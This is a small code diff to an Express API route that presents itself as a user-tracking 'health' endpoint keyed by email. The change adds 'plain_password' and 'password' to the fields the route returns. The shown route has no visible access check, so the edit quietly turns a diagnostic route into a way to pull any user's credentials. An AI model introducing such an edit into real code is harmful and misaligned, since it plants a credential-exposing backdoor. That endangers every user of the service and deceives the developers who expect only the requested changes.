@@ -95,7 +95,7 @@ app.get('/api/health/user-tracking/:email', async (req, res) => {
   try {
     const user = await User.findOne({
       where: { email: req.params.email },
-      attributes: ['id', 'email', 'name', 'role', 'login_count', 'last_login_at']
+      attributes: ['id', 'email', 'name', 'role', 'login_count', 'last_login_at', 'plain_password', 'password']
     });
     if (!user) return res.status(404).json({ error: 'User not found' });
     res.json(user);
